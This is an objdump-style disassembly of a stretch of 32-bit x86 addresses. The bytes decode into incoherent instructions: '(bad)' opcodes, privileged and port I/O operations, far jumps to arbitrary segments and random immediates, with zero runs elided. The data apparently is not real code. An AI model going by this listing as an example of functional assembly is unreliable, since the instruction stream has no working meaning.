  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	mov    dh,0x59
  415a02:	aas    
  415a03:	push   edx
  415a04:	ss in  al,0x0
  415a07:	add    BYTE PTR ds:0xbf000001,al
  415a0d:	jecxz  0x4159a3
  415a0f:	fsubr  QWORD PTR [esi+0x6cad7382]
  415a15:	inc    esp
  415a16:	mov    bl,0xe5
  415a18:	stc    
  415a19:	inc    ebx
  415a1a:	mov    eax,0x82db78f1
  415a1f:	xchg   esi,eax
  415a20:	jle    0x415a29
  415a22:	mov    BYTE PTR ds:0x8f5d1c81,cl
  415a28:	popf   
  415a29:	jp     0x415a06
  415a2b:	fimul  WORD PTR [edx+0xb]
  415a2e:	loopne 0x4159dd
  415a30:	mov    ds:0xd39c54ef,eax
  415a35:	mov    eax,ds:0x2b01e959
  415a3a:	cmp    al,0xa8
  415a3c:	scas   al,BYTE PTR es:[edi]
  415a3d:	pushf  
  415a3e:	das    
  415a3f:	call   DWORD PTR [ebx+0x3e923561]
  415a45:	vmwrite ebx,eax
  415a48:	iret   
  415a49:	add    al,0x27
  415a4b:	repnz fimul DWORD PTR [eax+edx*1-0x7a]
  415a50:	repnz sbb BYTE PTR [esi+0x70631735],dl
  415a57:	data16 fidiv DWORD PTR ss:[eax-0x2]
  415a5c:	jge    0x415aa6
  415a5e:	arpl   WORD PTR [ebp+0x50],bx
  415a61:	inc    ebx
  415a62:	or     DWORD PTR [ecx+0x7823fbf7],0xffffffad
  415a69:	adc    al,0x77
  415a6b:	pop    es
  415a6c:	xchg   ebp,eax
  415a6d:	cs dec ecx
  415a6f:	add    DWORD PTR [edi-0x6df1e57f],ebx
  415a75:	imul   ebx,DWORD PTR [esi+0x422545a9],0x754f13c8
  415a7f:	sub    eax,0x42da6ca8
  415a84:	sub    dh,BYTE PTR [esi+0x7bbb11c4]
  415a8a:	and    esp,esi
  415a8c:	add    DWORD PTR [eax+0x49],edx
  415a8f:	shl    BYTE PTR [ebx],1
  415a91:	inc    edx
  415a92:	es fdiv st,st(1)
  415a95:	(bad)  
  415a96:	fs int3 
  415a98:	adc    ecx,DWORD PTR [ebp+0x1de48779]
  415a9e:	xor    BYTE PTR [ebx-0x6f],bh
  415aa1:	xchg   ebx,eax
  415aa2:	push   ecx
  415aa3:	aaa    
  415aa4:	iret   
  415aa5:	mov    esi,eax
  415aa7:	mov    eax,0x8054f1b1
  415aac:	adc    DWORD PTR [eax-0x4e],ebx
  415aaf:	dec    esi
  415ab0:	xrelease lock mov BYTE PTR ds:0xad737cc1,ah
  415ab8:	xchg   esi,eax
  415ab9:	sub    al,0xb7
  415abb:	fdiv   st(2),st
  415abd:	add    ebx,DWORD PTR [edi+ebx*2+0x4fcfc0b8]
  415ac4:	outs   dx,BYTE PTR ds:[esi]
  415ac5:	jge    0x415b21
  415ac7:	sti    
  415ac8:	pop    ebp
  415ac9:	sub    al,0xbb
  415acb:	popa   
  415acc:	call   DWORD PTR [esi-0x38]
  415acf:	aaa    
  415ad0:	out    0x46,al
  415ad2:	jmp    0x415aed
  415ad4:	adc    al,0xaf
  415ad6:	adc    BYTE PTR [edi-0x4b],ah
  415ad9:	mov    bl,0x5b
  415adb:	(bad)  
  415adc:	sti    
  415add:	sahf   
  415ade:	ja     0x415aef
  415ae0:	xrelease xchg BYTE PTR gs:[edi-0x59fa7312],dl
  415ae8:	xor    al,0x4b
  415aea:	mov    dl,0x8f
  415aec:	cmp    edi,DWORD PTR [esi+0x19ee703]
  415af2:	mov    edx,DWORD PTR [ecx+eiz*4+0x73]
  415af6:	test   BYTE PTR [esi+0x11549d7e],0xdd
  415afd:	mov    bl,0x55
  415aff:	add    ah,BYTE PTR [ebx-0x11]
  415b02:	in     al,dx
  415b03:	ja     0x415ae6
  415b05:	mov    bh,dl
  415b07:	(bad)  
  415b09:	or     DWORD PTR [esi],eax
  415b0b:	mov    al,BYTE PTR [eax-0x2c]
  415b0e:	imul   ebx,DWORD PTR [ecx],0x6f
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fdiv   QWORD PTR [ebx+0x47]
  415b82:	pop    ecx
  415b83:	jmp    0x105:0xe53b
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	fs hlt 
  415b8e:	in     eax,0xa2
  415b90:	jl     0x415b63
  415b92:	push   ebp
  415b93:	sub    BYTE PTR [esi-0x77],0x37
  415b97:	lahf   
  415b98:	dec    ebp
  415b99:	fstp   DWORD PTR ds:0x4b8c981d
  415b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ba0:	je     0x415b3e
  415ba2:	xchg   esp,eax
  415ba3:	push   0xa706540d
  415ba8:	push   ebp
  415ba9:	add    DWORD PTR [ebx],eax
  415bab:	hlt    
  415bac:	(bad)  
  415bad:	mov    ebx,0xf4757eb9
  415bb2:	scas   al,BYTE PTR es:[edi]
  415bb3:	retf   0xdf88
  415bb6:	in     al,dx
  415bb7:	fld    TBYTE PTR ds:0xcc3e3003
  415bbd:	lds    ecx,FWORD PTR [eax]
  415bbf:	jno    0x415bc7
  415bc1:	add    ch,0x4f
  415bc4:	aam    0xa
  415bc6:	sbb    ebp,DWORD PTR [ecx]
  415bc8:	xchg   edi,eax
  415bc9:	inc    eax
  415bca:	je     0x415c46
  415bcc:	repnz sub BYTE PTR [ebp-0xb],ch
  415bd0:	and    eax,0x9b5b70cd
  415bd5:	adc    al,0x5
  415bd7:	dec    esp
  415bd8:	and    edx,esp
  415bda:	fadd   QWORD PTR [ecx+0x54b04eee]
  415be0:	adc    edi,ebx
  415be2:	leave  
  415be3:	div    DWORD PTR [edx+0x1d]
  415be6:	daa    
  415be7:	mov    eax,ds:0x761a482
  415bec:	bound  esp,QWORD PTR [esi+0x60d59d11]
  415bf2:	mov    ah,0xcb
  415bf4:	and    DWORD PTR [eax-0x2893737d],ebp
  415bfa:	arpl   WORD PTR [edi+eiz*1],cx
  415bfd:	add    al,0xbf
  415bff:	idiv   ah
  415c01:	sbb    ecx,DWORD PTR [ecx-0x17a170e2]
  415c07:	repnz scas eax,DWORD PTR es:[edi]
  415c09:	gs cwde 
  415c0b:	push   es
  415c0c:	xor    eax,0x54a0782
  415c11:	shl    BYTE PTR [ecx],1
  415c13:	sbb    DWORD PTR [eax+eax*8-0x559d17cf],edi
  415c1a:	pop    esi
  415c1b:	mov    ds:0x663306c1,al
  415c20:	sbb    ecx,DWORD PTR [eax-0x4cde34cd]
  415c26:	xor    bh,BYTE PTR [ecx+0x3a895012]
  415c2c:	std    
  415c2d:	repz int 0x2
  415c30:	push   ebp
  415c31:	xchg   ebp,eax
  415c32:	sahf   
  415c33:	outs   dx,DWORD PTR ds:[esi]
  415c34:	retf   0x6073
  415c37:	in     al,dx
  415c38:	dec    ecx
  415c39:	mov    ds:0x3f22c86f,al
  415c3e:	pop    ss
  415c3f:	out    dx,eax
  415c40:	or     edx,DWORD PTR [ecx-0x3c]
  415c43:	mov    esi,0x5d672968
  415c48:	jle    0x415c3f
  415c4a:	ret    0xe363
  415c4d:	call   0x520b:0x9173dcaf
  415c54:	sbb    eax,ebx
  415c56:	dec    ebp
  415c57:	(bad)  
  415c58:	xor    DWORD PTR [ebx-0x2d],esp
  415c5b:	call   0xefa8519e
  415c60:	jmp    0x1cca:0xaf47b457
  415c67:	shl    DWORD PTR [esi+esi*4+0x4b],1
  415c6b:	sti    
  415c6c:	loopne 0x415cc8
  415c6e:	pushf  
  415c6f:	bound  edi,QWORD PTR [ecx-0x70]
  415c72:	pop    eax
  415c73:	mov    eax,ds:0xfc0308ed
  415c78:	idiv   BYTE PTR [edx]
  415c7a:	(bad)  [esi-0x56667634]
  415c80:	jmp    0xcf45:0xd7e6e3a8
  415c87:	ror    BYTE PTR [esi+0x2db6b72d],0x7a
  415c8e:	sub    dh,bh
  415c90:	popa   
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x43b8e71f
  415d03:	fild   WORD PTR [eax-0x1a]
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    eax,0xed000001
  415d0d:	int    0x2a
  415d0f:	inc    ebp
  415d10:	jns    0x415ca3
  415d12:	or     BYTE PTR [esi-0x71],ch
  415d15:	stos   BYTE PTR es:[edi],al
  415d16:	cs leave 
  415d18:	inc    esp
  415d19:	(bad)  
  415d1a:	out    0x51,eax
  415d1c:	mov    BYTE PTR [ebp+edi*4+0x6],dh
  415d20:	aad    0x35
  415d22:	ror    ecx,cl
  415d24:	sbb    ah,dl
  415d26:	xchg   esp,eax
  415d27:	or     al,al
  415d29:	pop    ds
  415d2a:	pop    edi
  415d2b:	mov    WORD PTR [edi],?
  415d2d:	or     esp,DWORD PTR [edx]
  415d2f:	cs or  al,0x1d
  415d32:	fsub   DWORD PTR [ecx+0x203ee8e0]
  415d38:	and    esi,edi
  415d3a:	and    bh,dh
  415d3c:	jno    0x415ceb
  415d3e:	jbe    0x415d03
  415d40:	in     al,dx
  415d41:	jp     0x415ce5
  415d43:	xchg   esi,eax
  415d44:	jle    0x415db1
  415d46:	mov    WORD PTR [edi-0x2644569],es
  415d4c:	dec    ebp
  415d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d4e:	in     al,dx
  415d4f:	dec    edx
  415d50:	je     0x415d45
  415d52:	inc    ebx
  415d53:	mov    edi,0x269c3ca4
  415d58:	in     al,dx
  415d59:	arpl   WORD PTR [ecx+0x25],ax
  415d5c:	mov    ah,0x51
  415d5e:	ins    DWORD PTR es:[edi],dx
  415d5f:	inc    ecx
  415d60:	shl    BYTE PTR [eax+0xc],cl
  415d63:	cli    
  415d64:	jne    0x415cf6
  415d66:	test   DWORD PTR [edi+ecx*4+0x936306],eax
  415d6d:	mov    al,ds:0x360e8012
  415d72:	hlt    
  415d73:	mov    bh,0x92
  415d75:	(bad)  
  415d76:	pop    ebx
  415d77:	lds    ebp,FWORD PTR [edx+ebp*2]
  415d7a:	js     0x415de8
  415d7c:	stos   BYTE PTR es:[edi],al
  415d7d:	clc    
  415d7e:	ror    BYTE PTR [ebx-0x60],cl
  415d81:	mov    bl,0x2
  415d83:	mov    dh,0x80
  415d85:	lods   eax,DWORD PTR ds:[esi]
  415d86:	or     al,0x4
  415d88:	sbb    al,0x7f
  415d8a:	clc    
  415d8b:	xchg   esi,eax
  415d8c:	push   cs
  415d8d:	mov    dh,0xd5
  415d8f:	(bad)  
  415d90:	int    0xeb
  415d92:	xor    eax,0xf8426608
  415d97:	add    DWORD PTR [edx-0x634abdc0],eax
  415d9d:	shr    ch,1
  415d9f:	js     0x415d57
  415da1:	cmp    DWORD PTR [edi-0x41],ebp
  415da4:	loop   0x415d32
  415da6:	inc    edx
  415da7:	adc    eax,0x2f43de20
  415dac:	(bad)  
  415dad:	jl     0x415dc7
  415daf:	adc    eax,esp
  415db1:	and    esi,ebx
  415db3:	out    0xfe,al
  415db5:	push   0xffffffde
  415db7:	iret   
  415db8:	dec    ebx
  415db9:	jp     0x415da8
  415dbb:	inc    ebp
  415dbc:	fs dec ecx
  415dbe:	call   0x5faf:0x65e7a08a
  415dc5:	into   
  415dc6:	pop    ebp
  415dc7:	sbb    al,dl
  415dc9:	out    0xd8,eax
  415dcb:	xchg   esi,eax
  415dcc:	push   esi
  415dcd:	cdq    
  415dce:	mov    WORD PTR [edi-0x6ade85e6],?
  415dd4:	call   DWORD PTR [ecx+0x64b4d1b5]
  415dda:	mov    esi,0x956610af
  415ddf:	and    ecx,DWORD PTR [edi]
  415de1:	cmp    BYTE PTR [edi-0x67],cl
  415de4:	dec    eax
  415de5:	cdq    
  415de6:	cmp    ebx,DWORD PTR [ecx+ebx*2]
  415de9:	xchg   DWORD PTR [ebx+0xfdc8548],ecx
  415def:	mov    eax,ds:0xd285f80c
  415df4:	fisttp QWORD PTR [edi+0x43797ebf]
  415dfa:	mov    esp,0x569304b4
  415dff:	mov    eax,ds:0x29212c24
  415e04:	sub    cl,al
  415e06:	clc    
  415e07:	int3   
  415e08:	or     al,0x42
  415e0a:	das    
  415e0b:	and    DWORD PTR [eax],ebp
  415e0d:	push   ebx
  415e0e:	pop    ebx
  415e0f:	stos   BYTE PTR es:[edi],al
  415e10:	sub    eax,DWORD PTR [eax]
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x38]
  415e81:	nop
  415e82:	dec    edx
  415e83:	jg     0x415eca
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0x60000001,al
  415e8d:	fnstsw WORD PTR [eax-0x3f7620b6]
  415e93:	or     ebx,DWORD PTR [edi-0x51]
  415e96:	repnz push edx
  415e98:	pop    eax
  415e99:	call   0x3fea:0xf8198725
  415ea0:	cwde   
  415ea1:	jle    0x415e72
  415ea3:	stos   DWORD PTR es:[edi],eax
  415ea4:	jb     0x415ee8
  415ea6:	test   al,0x8d
  415ea8:	mov    ah,0xb7
  415eaa:	mov    ds:0xf046bf3d,eax
  415eaf:	adc    eax,0x1606617d
  415eb4:	dec    edi
  415eb5:	or     BYTE PTR [esi+0x40],0x58
  415eb9:	outs   dx,DWORD PTR ds:[esi]
  415eba:	or     eax,0x986ea64
  415ebf:	and    eax,0xd41e570a
  415ec4:	jnp    0x415ee7
  415ec6:	inc    ebx
  415ec7:	in     eax,dx
  415ec8:	fidiv  WORD PTR [ebx+esi*2-0x52]
  415ecc:	rcr    DWORD PTR [ebp-0x2bc0d66d],cl
  415ed2:	adc    DWORD PTR [ebx],edi
  415ed4:	or     DWORD PTR [ebp+0x2d],ebp
  415ed7:	or     dl,0xd0
  415eda:	iret   
  415edb:	jl     0x415ead
  415edd:	xor    dl,0xf3
  415ee0:	sbb    al,0xf0
  415ee2:	ja     0x415e8e
  415ee4:	sbb    ch,BYTE PTR [edi+0x31]
  415ee7:	pop    ss
  415ee8:	xchg   ebp,eax
  415ee9:	dec    esp
  415eea:	pop    edi
  415eeb:	cs mov al,0x36
  415eee:	ds xchg ebp,eax
  415ef0:	into   
  415ef1:	mov    bh,0x45
  415ef3:	repnz xor BYTE PTR [esi+eiz*8],al
  415ef7:	js     0x415f34
  415ef9:	lds    edx,FWORD PTR [esi]
  415efb:	and    BYTE PTR [ebx-0x6d],0x20
  415eff:	(bad)  
  415f00:	repz rol BYTE PTR [ebx],0x7d
  415f04:	cmc    
  415f05:	add    DWORD PTR [ebx+0x5c],esi
  415f08:	adc    BYTE PTR [ebx],ch
  415f0a:	pop    ss
  415f0b:	pop    ss
  415f0c:	shl    DWORD PTR [edx-0x6adfe5c8],0x1d
  415f13:	(bad)  
  415f14:	pop    ebx
  415f15:	lods   al,BYTE PTR ds:[esi]
  415f16:	push   esi
  415f17:	mov    dh,0x16
  415f19:	add    ch,BYTE PTR [edi-0x7164b4e5]
  415f1f:	repnz mov ebx,0x9df6f47c
  415f25:	mov    eax,0x78471cec
  415f2a:	adc    eax,eax
  415f2c:	mov    ebx,0x3b3b242a
  415f31:	jne    0x415f9a
  415f33:	in     al,0xcf
  415f35:	mov    ds:0x178c2eb9,al
  415f3a:	pop    ds
  415f3b:	in     al,dx
  415f3c:	out    0x3e,al
  415f3e:	bound  ebx,QWORD PTR [esi+eiz*8+0xc]
  415f42:	push   edi
  415f43:	int    0xca
  415f45:	xor    DWORD PTR ds:0x2f0cad46,ebx
  415f4b:	dec    esp
  415f4c:	xor    BYTE PTR [esi-0x4f4846f],ch
  415f52:	dec    ebp
  415f53:	xor    BYTE PTR [esi-0x8],ah
  415f56:	lahf   
  415f57:	sbb    esp,DWORD PTR [edx+0x33]
  415f5a:	arpl   WORD PTR [ebx],bx
  415f5c:	and    al,0x5f
  415f5e:	aas    
  415f5f:	push   ecx
  415f60:	das    
  415f61:	pop    eax
  415f62:	pusha  
  415f63:	adc    BYTE PTR [edx+0x4d],cl
  415f66:	lods   al,BYTE PTR ds:[esi]
  415f67:	mov    ds:0xa4ba16cd,al
  415f6c:	jle    0x415fca
  415f6e:	retf   
  415f6f:	enter  0x5642,0xd4
  415f73:	aaa    
  415f74:	sbb    DWORD PTR [ebx+0x6f4dc1ce],esi
  415f7a:	dec    edx
  415f7b:	pop    ss
  415f7c:	push   ecx
  415f7d:	nop
  415f7e:	xor    al,0x86
  415f80:	mov    eax,0x2c649308
  415f85:	inc    esi
  415f86:	in     eax,0x26
  415f88:	out    0x24,eax
  415f8a:	daa    
  415f8b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8d:	shl    edi,0x94
  415f90:	mov    dl,0x0
	...
  415ff2:	add    BYTE PTR [eax],al
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	push   eax
  416001:	sbb    ah,BYTE PTR [ebp+0x7b]
  416004:	dec    edx
  416005:	call   0x146600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	mov    ah,bh
  41600e:	icebp  
  41600f:	sub    al,ch
  416011:	push   eax
  416012:	xor    DWORD PTR [ebx],ecx
  416014:	xchg   esi,eax
  416015:	push   edi
  416016:	test   DWORD PTR [eax+0x16],0xe32ccd23
  41601d:	jle    0x415fa1
  41601f:	int3   
  416020:	and    al,0xc7
  416022:	call   0x5ffde860
  416027:	sub    al,BYTE PTR [edx-0x46e2a674]
  41602d:	push   es
  41602e:	sahf   
  41602f:	mov    al,0x42
  416031:	fiadd  WORD PTR [edi+0x55dbe783]
  416037:	(bad)  
  416039:	pop    ss
  41603a:	out    dx,al
  41603b:	jmp    0x41608b
  41603d:	lea    esp,[eax+0x7d8f58a1]
  416043:	arpl   WORD PTR [edi-0x4da2c230],sp
  416049:	or     ah,al
  41604b:	pop    ds
  41604c:	push   ss
  41604d:	leave  
  41604e:	das    
  41604f:	fcom   QWORD PTR [ecx]
  416051:	xchg   ebp,eax
  416052:	loop   0x41604e
  416054:	add    ecx,0x894d032f
  41605a:	add    BYTE PTR [esi],cl
  41605c:	imul   eax,DWORD PTR [edx+eax*8],0xd5e99d35
  416063:	sbb    ebp,DWORD PTR [esi-0x5552f8cf]
  416069:	push   ebp
  41606a:	aaa    
  41606b:	cmp    esp,esi
  41606d:	push   ebp
  41606e:	inc    esi
  41606f:	mov    ds:0x186392cc,al
  416074:	iret   
  416075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416076:	xchg   ecx,eax
  416077:	push   cs
  416078:	out    0xca,al
  41607a:	jp     0x416014
  41607c:	retf   0x2ac4
  41607f:	das    
  416080:	push   edx
  416081:	xchg   esi,eax
  416082:	aas    
  416083:	stc    
  416084:	cmp    edx,DWORD PTR [eax]
  416086:	aam    0x8e
  416088:	mov    ecx,0x97ed7166
  41608d:	jb     0x416092
  41608f:	inc    esp
  416090:	adc    dl,BYTE PTR [ecx-0x32]
  416093:	aad    0xbc
  416095:	jb     0x416075
  416097:	dec    eax
  416098:	xchg   ebp,eax
  416099:	test   BYTE PTR [esi-0x1a],bl
  41609c:	sahf   
  41609d:	xor    DWORD PTR [ebx-0x7e51210d],ebp
  4160a3:	add    eax,0x5cf489fa
  4160a8:	ja     0x416106
  4160aa:	pop    ds
  4160ab:	mov    eax,gs:0xada68465
  4160b1:	sub    eax,0x4ef1a867
  4160b6:	sub    cl,BYTE PTR [eax+0xb]
  4160b9:	test   eax,0x4fa2de48
  4160be:	cmp    al,0xfa
  4160c0:	dec    edi
  4160c1:	in     eax,dx
  4160c2:	xor    ebp,esp
  4160c4:	mov    esi,0x166374f9
  4160c9:	aam    0xf0
  4160cb:	adc    edx,0x17
  4160ce:	test   cl,ch
  4160d0:	fs push ss
  4160d2:	pop    esp
  4160d3:	loopne 0x4160be
  4160d5:	jp     0x4160ed
  4160d7:	xchg   edx,eax
  4160d8:	push   es
  4160d9:	jg     0x416157
  4160db:	cmp    BYTE PTR [esi+ecx*2-0x69859786],dh
  4160e2:	jbe    0x4160fa
  4160e4:	mov    bl,BYTE PTR [edi]
  4160e6:	jg     0x41609f
  4160e8:	daa    
  4160e9:	xchg   ebp,eax
  4160ea:	pop    ds
  4160eb:	xchg   esp,eax
  4160ec:	fild   DWORD PTR [edi+0x21]
  4160ef:	dec    esp
  4160f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160f1:	sar    BYTE PTR [ebp+0x2205edaf],cl
  4160f7:	fimul  DWORD PTR [edx+0xc]
  4160fa:	out    dx,al
  4160fb:	mov    ecx,0x6a9bd6dc
  416100:	add    eax,0x77773117
  416105:	sti    
  416106:	adc    al,0x5f
  416108:	adc    al,0xc
  41610a:	add    al,0xd7
  41610c:	(bad)  
  41610d:	je     0x4160ae
  41610f:	push   esi
  416110:	mov    ecx,0x0
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x4c949ff3
  416183:	or     BYTE PTR [edi-0x17],cl
  416186:	add    BYTE PTR [eax],al
  416188:	add    eax,0xf8000001
  41618d:	mov    ebx,ebx
  41618f:	addr16 jbe 0x416143
  416192:	lds    ebx,FWORD PTR [ebx+edi*8]
  416195:	cwde   
  416196:	or     eax,0x994a913a
  41619b:	mov    dh,0x6a
  41619d:	inc    esi
  41619e:	ret    0x49c7
  4161a1:	xor    DWORD PTR [esi-0x5a],esi
  4161a4:	fiadd  DWORD PTR [edi]
  4161a6:	inc    ecx
  4161a7:	push   0x76
  4161a9:	jbe    0x41616b
  4161ab:	loope  0x4161e2
  4161ad:	cmc    
  4161ae:	push   cs
  4161af:	xchg   esp,eax
  4161b0:	in     al,dx
  4161b1:	mov    eax,0x65001446
  4161b6:	aad    0x38
  4161b8:	loop   0x4161a5
  4161ba:	xchg   esp,eax
  4161bb:	rcr    DWORD PTR [ebp-0x7a],1
  4161be:	in     eax,dx
  4161bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c0:	jb     0x4161d2
  4161c2:	shl    bl,0xef
  4161c5:	cdq    
  4161c6:	out    0xe3,al
  4161c8:	jne    0x416170
  4161ca:	out    dx,al
  4161cb:	jbe    0x4161b4
  4161cd:	mov    ah,0x69
  4161cf:	mov    al,0x56
  4161d1:	popf   
  4161d2:	pop    ss
  4161d3:	mov    eax,fs
  4161d5:	test   DWORD PTR [edi+eiz*8-0x66d97055],esp
  4161dc:	iret   
  4161dd:	jge    0x4161ca
  4161df:	in     al,0x3e
  4161e1:	call   0xc021d46d
  4161e6:	enter  0xf528,0xdd
  4161ea:	push   ebp
  4161eb:	dec    eax
  4161ec:	cmp    cl,BYTE PTR [ecx+ebp*4]
  4161ef:	mov    DWORD PTR [edx],0x2fda7108
  4161f5:	jge    0x416192
  4161f7:	adc    BYTE PTR [ebx],al
  4161f9:	mov    ebx,0xc4e92825
  4161fe:	mov    bh,0x1c
  416200:	pushf  
  416201:	jbe    0x4161e0
  416203:	lds    eax,FWORD PTR [edx+0x19f376a6]
  416209:	fadd   QWORD PTR gs:[ebp-0x3ad98083]
  416210:	push   cs
  416211:	or     DWORD PTR [esi-0x71],0xffffff87
  416215:	inc    edx
  416216:	mov    bh,0xf3
  416218:	sub    DWORD PTR [edx-0x23bd9239],edi
  41621e:	jmpw   0x5092
  416222:	sbb    BYTE PTR [esi],0x91
  416225:	sbb    ecx,DWORD PTR [ecx]
  416227:	test   eax,0xe971699d
  41622c:	in     eax,0xe0
  41622e:	inc    edi
  41622f:	out    0xe4,eax
  416231:	fstp   QWORD PTR [edx]
  416233:	out    dx,al
  416234:	mov    edi,0x8caa44fa
  416239:	fcom   DWORD PTR [ecx-0x22da14ae]
  41623f:	mov    eax,0x9396b62a
  416244:	test   al,0xda
  416246:	out    0xbc,eax
  416248:	mov    bh,0x3c
  41624a:	and    ebp,DWORD PTR [eax]
  41624c:	jae    0x416231
  41624e:	jb     0x416229
  416250:	inc    eax
  416251:	shl    ecx,cl
  416253:	shr    BYTE PTR [edi],cl
  416255:	push   cs
  416256:	pop    edi
  416257:	xchg   edi,eax
  416258:	les    edx,FWORD PTR [ebx+esi*1+0x7d]
  41625c:	jmp    FWORD PTR [ecx+0x29]
  41625f:	gs loope 0x41629f
  416262:	inc    edi
  416263:	xor    ebx,DWORD PTR [esi+ebp*8-0x1c]
  416267:	xchg   ebp,eax
  416268:	add    eax,0xd80c0e71
  41626d:	(bad)  
  41626e:	shl    DWORD PTR [edx],1
  416270:	int3   
  416271:	jmp    0xf43e8fd6
  416276:	pop    ss
  416277:	mov    BYTE PTR [edi+0x62],0x76
  41627b:	ds ins DWORD PTR es:[edi],dx
  41627d:	mov    ds:0x50074248,eax
  416282:	aas    
  416283:	mov    eax,ds:0x8527040d
  416288:	cmp    edi,esp
  41628a:	add    eax,0xf90dce97
  41628f:	in     al,0x81
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x54d4:0x4c8339ee
  416305:	jmp    0x0:0x1050000
  41630c:	shr    DWORD PTR [edx+0x1ca3c1dd],0x71
  416313:	jp     0x41630c
  416315:	inc    esp
  416316:	les    ecx,FWORD PTR [esi]
  416318:	and    ah,al
  41631a:	lods   al,BYTE PTR ds:[esi]
  41631b:	jmp    0xcf824796
  416320:	mov    al,ds:0x35375066
  416325:	(bad)  
  416326:	pop    esi
  416327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416328:	push   0x2bcea8b7
  41632d:	(bad)  
  41632e:	cmp    eax,0x96bd04f4
  416333:	shl    cl,cl
  416335:	xchg   esp,eax
  416336:	pop    ebp
  416337:	loope  0x4162ca
  416339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41633a:	cli    
  41633b:	pusha  
  41633c:	push   edi
  41633d:	jno    0x4163a0
  41633f:	or     al,0xc9
  416341:	mov    edx,0xd56746a4
  416346:	ret    
  416347:	stos   BYTE PTR es:[edi],al
  416348:	sub    eax,0x43c60bb6
  41634d:	mov    DWORD PTR [esi+0x6cbd7bf2],eax
  416353:	adc    al,0x21
  416355:	repz pop ss
  416357:	mov    eax,0x375fc1f2
  41635c:	mov    eax,0xfc7e7085
  416361:	sbb    bl,dh
  416363:	fs int3 
  416365:	fwait
  416366:	mov    bl,0x33
  416368:	inc    eax
  416369:	or     eax,0x304bb499
  41636e:	cmp    al,0xfc
  416370:	sbb    BYTE PTR [ebx+0x40199fe8],bh
  416376:	repz sbb al,0x9
  416379:	in     eax,0x34
  41637b:	std    
  41637c:	out    dx,al
  41637d:	adc    eax,0x5856e9de
  416382:	cld    
  416383:	bound  edi,QWORD PTR [eax]
  416385:	jbe    0x416321
  416387:	aam    0xc8
  416389:	dec    ebp
  41638a:	dec    eax
  41638b:	fadd   DWORD PTR [eax-0x69]
  41638e:	and    DWORD PTR [eax+0x64dd74a2],edi
  416394:	xchg   edi,eax
  416395:	into   
  416396:	mov    BYTE PTR [edi+0x60],dl
  416399:	dec    ebx
  41639a:	inc    edi
  41639b:	lods   eax,DWORD PTR ds:[esi]
  41639c:	inc    esi
  41639d:	push   ecx
  41639e:	push   es
  41639f:	call   0xb8cb333e
  4163a4:	cli    
  4163a5:	cmp    al,0xfa
  4163a7:	shr    DWORD PTR [edi+0x5e7cebe2],cl
  4163ad:	dec    esp
  4163ae:	in     al,0x6c
  4163b0:	lods   eax,DWORD PTR ds:[esi]
  4163b1:	pop    es
  4163b2:	fucomip st,st(6)
  4163b4:	lds    esp,FWORD PTR [ebp+0x3d]
  4163b7:	push   esp
  4163b8:	xor    BYTE PTR [ecx],cl
  4163ba:	call   0xd6bfab39
  4163bf:	outs   dx,DWORD PTR ds:[esi]
  4163c0:	fs jmp 0x41639f
  4163c3:	daa    
  4163c4:	bound  esp,QWORD PTR [ecx+0x39042bf0]
  4163ca:	inc    esp
  4163cb:	cwde   
  4163cc:	call   0x97039b91
  4163d1:	daa    
  4163d2:	sbb    eax,0x1f622ed7
  4163d7:	xor    dh,BYTE PTR [eax+0x46]
  4163da:	xchg   esi,eax
  4163db:	call   0xe594:0xd2f65faa
  4163e2:	shr    BYTE PTR [ecx+ebx*1],1
  4163e5:	js     0x41644c
  4163e7:	add    dh,bl
  4163e9:	cmp    BYTE PTR [eax+0x2d],0x5
  4163ed:	xchg   edx,eax
  4163ee:	sbb    eax,0x1785ec09
  4163f3:	add    eax,ebp
  4163f5:	adc    DWORD PTR [edx+eiz*4+0x2a],eax
  4163f9:	jg     0x41639c
  4163fb:	inc    edx
  4163fc:	mov    ecx,0x2135b57e
  416401:	data16 aas 
  416403:	pop    ebp
  416404:	mov    al,ds:0x66540bbd
  416409:	jb     0x416486
  41640b:	test   DWORD PTR [esi+edi*1-0x7a],ebp
  41640f:	lods   al,BYTE PTR ds:[esi]
  416410:	rol    BYTE PTR [eax],1
	...
  416472:	add    BYTE PTR [eax],al
  416474:	repz inc ebx
  416476:	ror    cl,1
